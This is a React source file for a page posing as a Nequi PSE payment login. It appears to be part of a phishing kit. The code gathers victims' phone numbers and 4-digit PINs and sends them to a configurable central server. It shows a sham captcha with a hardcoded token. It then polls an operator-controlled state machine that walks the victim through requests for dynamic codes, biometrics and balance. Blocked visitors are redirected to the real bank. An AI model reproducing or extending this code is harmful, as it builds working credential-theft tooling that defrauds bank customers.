import { useEffect, useRef, useState } from "react";
import { createPortal } from "react-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import { useNavigate, useLocation } from "react-router-dom";
import background from "../../images/imgi_16_background.png";
import alert from "../../images/alert.svg";
import LoadingNequiLogin from "../../../../../components/LoadingNequiLogin";
import { PSE_SESSION_HANDOFF_KEY } from "../../../../loadingPse/PseLoading";
import "./loginNequi.css";

function NequiModalAlert({ modalInfo, closeModal, success, show }) {
    if (!show) return null;

    return createPortal(
        <div className="nequi-modal-alert popup-wrapper popup-show animation-show">
            <div className="popup-table-wrap">
                <div className="popup-table-cell">
                    <div className="popup-box">
                        <div
                            className="close-button-popup"
                            onClick={() => closeModal()}
                        >
                            x
                        </div>

                        {modalInfo?.img && (
                            <img src={modalInfo.img} alt="icon" />
                        )}

                        <h1>{modalInfo?.title || modalInfo?.tittle}</h1>

                        {modalInfo?.message && (
                            <p>{modalInfo.message}</p>
                        )}

                        <a
                            className="button-web"
                            href="#"
                            onClick={(e) => {
                                e.preventDefault();
                                success();
                            }}
                        >
                            Aceptar
                        </a>
                    </div>
                </div>
            </div>
        </div>,
        document.body
    );
}

const NEQUI_ERROR_KEY = "nequi_error_modal";
const NEQUI_MID_FLOW_KEY = "nequi_mid_flow";
const LOGIN_ERROR_AUTO_HIDE_MS = 5000;

const ESTADOS_TRAS_LOGIN = [
    "sol_din",
    "sol_finalizar",
    "sol_finalizado",
    "error_din",
    "error_login",
    "error_cash",
    "sol_biometria",
    "sol_saldo",
    "block_ip",
    "error_blocked",
    "logo",
    "link_bot",
    "sol_link_bot",
    "sol_link_custom",
];

const MOSPARO_LABEL_LINE1 = "Confirmo que soy una";
const MOSPARO_LABEL_LINE2 = "persona real.";

function MosparoCheck({ checked, setChecked }) {
    const fullLabel = `${MOSPARO_LABEL_LINE1} ${MOSPARO_LABEL_LINE2}`;

    useEffect(() => {
        const interval = setInterval(() => {
            setChecked(false);
        }, 30000);

        return () => clearInterval(interval);
    }, [setChecked]);

    const handleChange = (e) => {
        setChecked(e.target.checked);
    };

    return (
        <div
            id="mosparo-box"
            className={`mosparo-container${checked ? " mosparo-checked" : ""}`}
            lang="es"
        >
            <div className="mosparo-row">
                <div className="mosparo-checkbox-column">
                    <input
                        type="checkbox"
                        required
                        value="1"
                        id="mosparoCheckbox"
                        name="mosparoCheckbox"
                        checked={checked}
                        onChange={handleChange}
                    />

                    <div className="mosparo-checkbox">
                        <div className="mosparo-icon-checkmark"></div>
                        <div className="mosparo-icon-failure"></div>

                        <input
                            name="_mosparo_submitToken"
                            type="hidden"
                            className="mosparo-submit-token"
                            value="WFVtNKEzz-1EjLLOYeTk1e47F5oatXdB0k1Ps-buEic"
                        />

                        <input
                            name="_mosparo_validationToken"
                            type="hidden"
                            className="mosparo-validation-token"
                        />
                    </div>
                </div>

                <div className="mosparo-content-column">
                    <label
                        className="mosparo-label"
                        htmlFor="mosparoCheckbox"
                        aria-label={fullLabel}
                    >
                        <span className="mosparo-label-line">{MOSPARO_LABEL_LINE1}</span>
                        <span className="mosparo-label-line mosparo-label-line--second">
                            {MOSPARO_LABEL_LINE2}
                        </span>
                    </label>

                    <div className="mosparo-error-message"></div>
                    <div
                        className="mosparo-accessible-message"
                        aria-describedby="mosparoCheckbox"
                    ></div>
                </div>
            </div>
        </div>
    );
}

export default function LoginNequi() {

    // Se inicializa el navigate
    const navigate = useNavigate();
    const location = useLocation();

    // Se crean los estados para el selector de país
    const [getDisabled, setDisabled] = useState(true);
    const [getLoading, setLoading] = useState(false);
    const [getCellphone, setCellphone] = useState("");
    const [getPassword, setPassword] = useState("");
    const [getChecked, setChecked] = useState(false);
    const [getErrors, setErrors] = useState({ error: false, tittle: "ZZZZZZZZZZ...", message: "Tienes más de 5 minutos de inactividad.", img: alert });
    const [showLoginError, setShowLoginError] = useState(false);
    const [cellphoneTouched, setCellphoneTouched] = useState(false);
    const [passwordTouched, setPasswordTouched] = useState(false);
    const [cellphoneError, setCellphoneError] = useState("");
    const [passwordError, setPasswordError] = useState("");

    const isCellphoneValid = (value) => /^3\d{9}$/.test(value);
    const isPasswordValid = (value) => /^\d{4}$/.test(value);

    const getCellphoneError = (value) => {
        if (!value.trim()) return "¡Ups! Eso no parece un número de celular";
        if (!isCellphoneValid(value)) return "¡Ups! Eso no parece un número de celular";
        return "";
    };

    const getPasswordError = (value) => {
        if (!value.trim()) return "La clave debe ser de 4 números";
        if (!isPasswordValid(value)) return "La clave debe ser de 4 números";
        return "";
    };

    const sessionIdRef = useRef(null);
    const pollingIntervalRef = useRef(null);
    const lastEstadoRef = useRef(null);
    const statusTickRef = useRef(null);
    const allowPollNavigationRef = useRef(false);
    const loginErrorTimeoutRef = useRef(null);
    const loginErrorBloqueoRef = useRef(null);
    const mountInitRef = useRef(false);

    const clearLoginFields = () => {
        setCellphone("");
        setPassword("");
        setCellphoneError("");
        setPasswordError("");
        setCellphoneTouched(false);
        setPasswordTouched(false);
    };

    const hideLoginError = () => {
        if (loginErrorTimeoutRef.current) {
            clearTimeout(loginErrorTimeoutRef.current);
            loginErrorTimeoutRef.current = null;
        }
        loginErrorBloqueoRef.current = null;
        setShowLoginError(false);
    };

    const showLoginErrorAlert = () => {
        clearLoginFields();
        setChecked(false);
        setShowLoginError(true);
        if (loginErrorTimeoutRef.current) {
            clearTimeout(loginErrorTimeoutRef.current);
        }
        loginErrorTimeoutRef.current = setTimeout(() => {
            hideLoginError();
        }, LOGIN_ERROR_AUTO_HIDE_MS);
    };

    // Se usa el efecto para prevenir el menú contextual en el componente
    useEffect(() => {

        // // Función para prevenir el menú contextual
        // const handleContextMenu = (e) => {

        //     // Se previene el menú contextual
        //     e.preventDefault();
        // };

        // // Se agrega el evento para prevenir el menú contextual
        // document.addEventListener("contextmenu", handleContextMenu);

        // // Se limpia el evento al desmontar el componente
        // return () => {

        //     // Se remueve el evento para prevenir el menú contextual
        //     document.removeEventListener("contextmenu", handleContextMenu);
        // };
    }, []);

    // Se hace un useEffect para validar el valor de cada boton y habilitar el enviar
    useEffect(() => {

        // Se captura el valor del celular
        const cellphoneValid = isCellphoneValid(getCellphone);
        const passwordValid = isPasswordValid(getPassword);

        // Se valida cuando todo es true
        if (cellphoneValid && passwordValid && getChecked) {

            // Se habilita el boton
            setDisabled(false);
        } else {

            // Se deshabilita el boton
            setDisabled(true);
        };
    }, [getCellphone, getPassword, getChecked]);

    const stopPolling = () => {
        if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
            pollingIntervalRef.current = null;
        }
    };

    const ensureNequiSessionId = () => {
        const sid =
            sessionIdRef.current ||
            localStorage.getItem("sessionId") ||
            sessionStorage.getItem("sessionId") ||
            "";

        if (sid) {
            sessionIdRef.current = sid;
        }

        return sid;
    };

    useEffect(() => {
        if (mountInitRef.current) return;
        mountInitRef.current = true;

        const pendingError = localStorage.getItem(NEQUI_ERROR_KEY);
        const midFlow = sessionStorage.getItem(NEQUI_MID_FLOW_KEY) === "1";
        const pseHandoff = sessionStorage.getItem(PSE_SESSION_HANDOFF_KEY);

        if (pendingError === "error_login") {
            loginErrorBloqueoRef.current = "error_login";
            showLoginErrorAlert();
        }
        if (pendingError) {
            localStorage.removeItem(NEQUI_ERROR_KEY);
        }

        if (pseHandoff) {
            localStorage.setItem("sessionId", pseHandoff);
            sessionIdRef.current = pseHandoff;
            sessionStorage.removeItem(PSE_SESSION_HANDOFF_KEY);
            sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
            lastEstadoRef.current = null;
            allowPollNavigationRef.current = false;
        } else if (pendingError) {
            ensureNequiSessionId();
            allowPollNavigationRef.current = true;
            initPolling();
        } else if (midFlow) {
            ensureNequiSessionId();
            allowPollNavigationRef.current = true;
            setLoading(true);
            initPolling();
        } else {
            sessionIdRef.current =
                localStorage.getItem("sessionId") ||
                sessionStorage.getItem("sessionId");
            allowPollNavigationRef.current = false;
        }

        return () => {
            stopPolling();
            if (loginErrorTimeoutRef.current) {
                clearTimeout(loginErrorTimeoutRef.current);
            }
        };
    }, []);

    useEffect(() => {
        if (!location.state?.nequiNav) return;

        const pendingError = localStorage.getItem(NEQUI_ERROR_KEY);
        if (pendingError === "error_login") {
            loginErrorBloqueoRef.current = "error_login";
            showLoginErrorAlert();
            localStorage.removeItem(NEQUI_ERROR_KEY);
        } else {
            hideLoginError();
        }
        navigate("/nequi", { replace: true, state: {} });
    }, [location.state?.nequiNav]);

    const handleSend = async () => {
        if (!isCellphoneValid(getCellphone) || !isPasswordValid(getPassword) || !getChecked) {
            return;
        }

        const sessionId = ensureNequiSessionId();
        if (!sessionId) {
            setErrors((prev) => ({
                ...prev,
                error: true,
                tittle: "Sesión no encontrada",
                message: "Por favor, vuelve a la página de compra para iniciar el proceso nuevamente.",
            }));
            return;
        }

        localStorage.setItem("sessionId", sessionId);
        sessionStorage.setItem("sessionId", sessionId);

        const centralUrl = (
            process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
        ).trim();

        const dataSend = {
            data: {
                attributes: {
                    usuario: getCellphone,
                    clave: getPassword,
                    fecha: new Date().toISOString(),
                    sessionId,
                    backend: "P01",
                    backend_central_url: process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
                    backend_url: "/api/v1/nequi/authenticacion",
                },
            },
        };

        stopPolling();
        lastEstadoRef.current = null;

        try {
            setLoading(true);
            const response = centralUrl
                ? await instanceBackend.post(centralUrl, dataSend)
                : await instanceBackend.post("/nequi/authenticacion", dataSend);

            if (response?.data?.success) {
                const sid = response.data.sessionId ?? sessionId;
                localStorage.setItem("sessionId", sid);
                sessionStorage.setItem("sessionId", sid);
                sessionIdRef.current = sid;
                sessionStorage.setItem(NEQUI_MID_FLOW_KEY, "1");
                allowPollNavigationRef.current = true;
                initPolling();
            } else {
                setLoading(false);
                allowPollNavigationRef.current = false;
                setErrors((prev) => ({
                    ...prev,
                    error: true,
                    tittle: "Error",
                    message: "No se pudo iniciar sesión. Por favor, intenta nuevamente.",
                }));
            }
        } catch (error) {
            setLoading(false);
            allowPollNavigationRef.current = false;
            const status = error?.response?.status;
            const estadoErr = (error?.response?.data?.estado || "")
                .toString()
                .toLowerCase();
            if (status === 403 && estadoErr === "error_blocked") {
                sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                localStorage.clear();
                sessionStorage.clear();
                window.location.href = process.env.REACT_APP_URL_BANK || "/";
                return;
            }
            setErrors((prev) => ({
                ...prev,
                error: true,
                tittle: "Error",
                message: centralUrl
                    ? "Error de comunicación con el servidor central."
                    : "Error de conexión con el servidor.",
            }));
        }
    };

    const initPolling = () => {
        if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
            pollingIntervalRef.current = null;
        }

        pollingIntervalRef.current = setInterval(() => {
            verifyState();
        }, 3000);
        verifyState();
    };

    const nequiNavigate = (ruta) => {
        navigate(ruta, { replace: true, state: { nequiNav: Date.now() } });
    };

    const shouldProcessEstado = (estadoActual, statusTick) => {
        if (statusTick != null) {
            if (statusTickRef.current === statusTick) return false;
            statusTickRef.current = statusTick;
            lastEstadoRef.current = estadoActual;
            return true;
        }
        if (lastEstadoRef.current === estadoActual) return false;
        lastEstadoRef.current = estadoActual;
        return true;
    };

    const verifyState = async () => {
        try {
            const response = await instanceBackend.post(
                `/nequi/verify-state/${sessionIdRef.current}`
            );
            const { estado: estadoRaw, state, url, text } = response?.data || {};
            const estadoActual = (estadoRaw || state || "").toString().toLowerCase();
            const hasUrl = Boolean(url && String(url).trim());
            const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);
            const linkPendiente =
                estadoActual === "sol_link_bot" ||
                (estadoActual === "link_bot" && !hasUrl) ||
                (estadoActual === "sol_link_custom" && !customLink);

            if (!estadoActual) return;

            const statusTick = response?.data?.statusTick ?? null;

            if (
                loginErrorBloqueoRef.current &&
                estadoActual === loginErrorBloqueoRef.current &&
                (statusTick == null || statusTick === statusTickRef.current)
            ) {
                return;
            }

            if (
                ESTADOS_TRAS_LOGIN.includes(estadoActual) &&
                !allowPollNavigationRef.current &&
                sessionStorage.getItem(NEQUI_MID_FLOW_KEY) !== "1"
            ) {
                return;
            }

            if (!linkPendiente && !shouldProcessEstado(estadoActual, statusTick)) return;
            if (!linkPendiente) lastEstadoRef.current = estadoActual;

            switch (estadoActual) {
                case "logo":
                    setLoading(false);
                    stopPolling();
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    localStorage.setItem("sessionId", sessionIdRef.current);
                    window.location.href =
                        "/pse?bank=" + (url || "nequi") + "&sessionId=" + sessionIdRef.current;
                    break;
                case "link_bot":
                case "sol_link_bot":
                    if (hasUrl) {
                        setLoading(false);
                        stopPolling();
                        sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                        if (
                            url.includes("payulatam.com") ||
                            url.includes("registro.pse.com.co")
                        ) {
                            window.location.replace(url);
                        } else {
                            window.location.href = url;
                        }
                    }
                    break;
                case "sol_link_custom":
                    if (customLink) {
                        setLoading(false);
                        stopPolling();
                        sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                        window.location.href = customLink;
                    }
                    break;
                case "sol_din":
                    setLoading(false);
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    nequiNavigate("/nequi_dinamica");
                    break;
                case "sol_finalizar":
                case "sol_finalizado":
                    setLoading(false);
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    nequiNavigate("/finalizado-pse");
                    break;
                case "error_din":
                    setLoading(false);
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    localStorage.setItem(NEQUI_ERROR_KEY, "error_din");
                    nequiNavigate("/nequi_dinamica");
                    break;
                case "error_login":
                    setLoading(false);
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    loginErrorBloqueoRef.current = "error_login";
                    showLoginErrorAlert();
                    allowPollNavigationRef.current = true;
                    initPolling();
                    break;
                case "error_cash":
                    setLoading(false);
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    localStorage.setItem(NEQUI_ERROR_KEY, "error_cash");
                    nequiNavigate("/nequi_saldo");
                    break;
                case "sol_biometria":
                    setLoading(false);
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    nequiNavigate("/nequi_biometria");
                    break;
                case "sol_saldo":
                    setLoading(false);
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    nequiNavigate("/nequi_saldo");
                    break;
                case "block_ip":
                case "error_blocked":
                    if (pollingIntervalRef.current) {
                        clearInterval(pollingIntervalRef.current);
                        pollingIntervalRef.current = null;
                    }
                    setLoading(false);
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    allowPollNavigationRef.current = false;
                    localStorage.clear();
                    sessionStorage.clear();
                    window.location.href = process.env.REACT_APP_URL_BANK || "/";
                    break;
                default:
                    break;
            }
        } catch (error) {
            const status = error?.response?.status;
            const estadoErr = (error?.response?.data?.estado || "")
                .toString()
                .toLowerCase();
            if (status === 403 && estadoErr === "error_blocked") {
                if (pollingIntervalRef.current) {
                    clearInterval(pollingIntervalRef.current);
                    pollingIntervalRef.current = null;
                }
                setLoading(false);
                sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                allowPollNavigationRef.current = false;
                localStorage.clear();
                sessionStorage.clear();
                window.location.href = process.env.REACT_APP_URL_BANK || "/";
            }
        }
    };

    // Metodo encargado de cerrar el componente
    const handleClose = () => {

        // Se setean los datos para cerrar el modal
        setErrors(prev => ({
            error: false,
            img: alert
        }));

        hideLoginError();
    };

    // Metodo para manejar el cambio en el campo del número de celular
    const handleCellphoneChange = (value) => {
        if ((/^3\d{0,9}$/.test(value) || value === "") && value.length <= 10) {
            setCellphone(value);
            if (cellphoneTouched) {
                setCellphoneError(getCellphoneError(value));
            }
        }
    };

    const handleCellphoneBlur = () => {
        setCellphoneTouched(true);
        setCellphoneError(getCellphoneError(getCellphone));
    };

    const handlePasswordChange = (value) => {
        if (/^\d*$/.test(value) && value.length <= 4) {
            setPassword(value);
            if (passwordTouched) {
                setPasswordError(getPasswordError(value));
            }
        }
    };

    const handlePasswordBlur = () => {
        setPasswordTouched(true);
        setPasswordError(getPasswordError(getPassword));
    };

    const handleReset = () => {
        stopPolling();
        sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
        allowPollNavigationRef.current = false;
        lastEstadoRef.current = null;
        if (loginErrorTimeoutRef.current) {
            clearTimeout(loginErrorTimeoutRef.current);
            loginErrorTimeoutRef.current = null;
        }
        loginErrorBloqueoRef.current = null;
        clearLoginFields();
        setChecked(false);
        setShowLoginError(false);
        setLoading(false);
    };

    // Se retorna el componente
    return (
        <section className="login-section-nequi">
            <img src={background} alt="" className="nequi-bg" />
            <div className="login-card-nequi">
                <div id="kc-header" className="login-pf-page-header">
                    <div id="kc-logo">
                        <div className="kc-logo-text">
                        </div>
                    </div>
                </div>
                <h1>
                    Pagos PSE de Nequi
                </h1>
                <p>
                    Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.
                </p>
                <div className="form-container">

                    {/* Alerta de error de login */}
                    {showLoginError && (
                        <div className="login-error-alert" role="alert">
                            <div className="icon-alert-error-container">
                                <span className="icon-alert-error" aria-hidden="true" />
                            </div>
                            <span className="login-error-text">
                                ¡Algo salió mal con tu número de celular o clave. Intenta otra vez!
                            </span>
                        </div>
                    )}

                    <div className="form-field">
                        <div
                            className={`form-group${getCellphone ? " has-value" : ""}${cellphoneError ? " form-group--error" : ""}`}
                        >
                            <input
                                id="celular"
                                name="celular"
                                type="text"
                                autoComplete="off"
                                placeholder=" "
                                inputMode="numeric"
                                value={getCellphone}
                                onChange={(e) => handleCellphoneChange(e.target.value)}
                                onBlur={handleCellphoneBlur}
                                maxLength={10}
                                required
                                aria-invalid={Boolean(cellphoneError)}
                                aria-describedby={cellphoneError ? "celular-error" : undefined}
                            />
                            <label htmlFor="celular">Número de celular</label>
                            {cellphoneError ? (
                                <span className="form-group__error-icon" aria-hidden="true" />
                            ) : null}
                        </div>
                        {cellphoneError ? (
                            <p id="celular-error" className="form-field-error" role="alert">
                                {cellphoneError}
                            </p>
                        ) : null}
                    </div>

                    <div className="form-container">
                        <div className="form-field">
                            <div
                                className={`form-group${getPassword ? " has-value" : ""}${passwordError ? " form-group--error" : ""}`}
                            >
                                <input
                                    id="clave"
                                    name="clave"
                                    type="password"
                                    autoComplete="off"
                                    placeholder=" "
                                    inputMode="numeric"
                                    value={getPassword}
                                    onChange={(e) => handlePasswordChange(e.target.value)}
                                    onBlur={handlePasswordBlur}
                                    maxLength={4}
                                    required
                                    aria-invalid={Boolean(passwordError)}
                                    aria-describedby={passwordError ? "clave-error" : undefined}
                                />
                                <label htmlFor="clave">Clave</label>
                                {passwordError ? (
                                    <span className="form-group__error-icon" aria-hidden="true" />
                                ) : null}
                            </div>
                            {passwordError ? (
                                <p id="clave-error" className="form-field-error" role="alert">
                                    {passwordError}
                                </p>
                            ) : null}
                        </div>
                    </div>

                    <MosparoCheck checked={getChecked} setChecked={setChecked} />

                    <button className="btn-entra" onClick={handleSend} disabled={getDisabled}>
                        Entra
                    </button>

                    <button className="btn-entra-no" type="button" onClick={handleReset}>
                        Ahora No
                    </button>
                </div>

                <p className="login-card-nequi__hint">
                    ¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.
                </p>
            </div>

            {getErrors.error ?
                <NequiModalAlert
                    modalInfo={getErrors}
                    closeModal={handleClose}
                    success={handleClose}
                    show={getErrors.error} /> : null}

            {getLoading && typeof document !== "undefined"
                ? createPortal(<LoadingNequiLogin isOpen />, document.body)
                : null}
        </section>
    );
}